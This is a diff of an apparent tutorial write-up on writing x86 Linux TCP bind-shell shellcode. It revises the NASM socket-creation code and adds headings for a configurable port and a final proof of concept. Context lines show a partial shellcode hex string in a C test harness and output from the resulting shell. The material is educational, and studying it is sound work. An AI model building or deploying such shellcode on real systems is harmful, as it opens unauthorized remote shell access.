@@ -183,35 +183,28 @@ SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
 
 The last argument value for int protocol is going to be ‘0’ to accept any protocol according to the man pages definition for socket. 
 
-The registers would show the following at this stage:
-
-* EBX == 0x02
-* ECX == 0x01
-* EDX == 0x00
-
-The EDX register was already cleared when initialized, the zero value is set and does not require any change.
-
-The socket syscall is executed with int 0x80 which creates the socket in the program, passing control to the interrupt vector in order to handle the socket syscall:
-
 ```nasm
-	int 0x80       ; call the interrupt to create the socket, execute the syscall
+        ; push socket values onto the stack
+        push esi        ; push 0 onto the stack, default protocol
+        push 0x1        ; push 1 onto the stack, SOCK_STREAM
+        push 0x2        ; push 2 onto the stack, AF_INET
 ```
 
-The newly created socket can be identified by storing the value of EAX into the EDI register as reference for a later stage (with the ability to use EAX in subsequent system calls):
+The newly created socket can be identified by storing the value of EAX into the EDX register as reference for a later stage (with the ability to use EAX in subsequent system calls):
 
 ```nasm
-	mov edi, eax   ; move the value of eax into edi for later reference
+	mov edx, eax   ; move the value of eax into edx for later reference
 ```
 
 1st Syscall (Assembly code section):
 
 ```nasm
-	; 1st syscall - create socket
-	mov al, 0x66    ; hex value for socket
-	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
-	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h
-	int 0x80        ; create the socket, execute the syscall 
-	mov edi, eax    ; move the value of eax into edi for later reference
+        ; 1st syscall - create socket
+        mov al, 0x66    ; hex value for socket
+        mov bl, 0x1     ; socket
+        mov ecx, esp    ; pointer to the arguments pushed
+        int 0x80        ; call the interrupt to create the socket, execute the syscall
+        mov edx, eax    ; save the return value
 ```
 
 #### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)
@@ -790,6 +783,9 @@ $ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
+#### Configurable Port (Customize Shellcode) 
+------
+
 Objdump is used to extract the shellcode from the TCP bind shell in hex format (Null free):
 
 ```bash
@@ -894,6 +890,9 @@ unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x02\xb1\x01
     return 0;
 }
 ```
+
+#### POC (Final Shellcode) 
+------
 
 The C program is compiled as an executable binary and executed:
 
